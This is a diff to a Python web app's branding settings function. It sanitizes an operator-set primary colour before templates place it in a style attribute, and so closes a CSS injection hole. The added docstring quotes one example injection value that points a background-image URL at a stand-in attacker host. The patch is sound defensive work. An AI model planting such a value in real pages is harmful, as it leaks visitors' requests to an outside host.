@@ -465,13 +465,24 @@ def app_branding(db: Session) -> Dict[str, Any]:
 
     Single query per render so the nav, login page, and footer can stay
     operator-controlled without each template knowing about ``runtime``.
+
+    ``primary_color`` is passed through ``safe_css_color`` on the way out.
+    base.html interpolates it into a ``style`` attribute, where autoescaping
+    stops an attribute breakout but not CSS itself -- ``red; background-image:
+    url(https://attacker/?c=)`` stays inside the declaration and still calls
+    out. Guarding at the sink covers values that predate the input validation,
+    values put there by a direct DB edit, and any future writer.
     """
+    from central.branding import safe_css_color
+
     full = load_settings(db)
-    return {
+    out = {
         key.split(".", 1)[1]: value
         for key, value in full.items()
         if key.startswith("app.")
     }
+    out["primary_color"] = safe_css_color(out.get("primary_color"))
+    return out
 
 
 def masked_for_form(values: Dict[str, Any]) -> Dict[str, Any]:
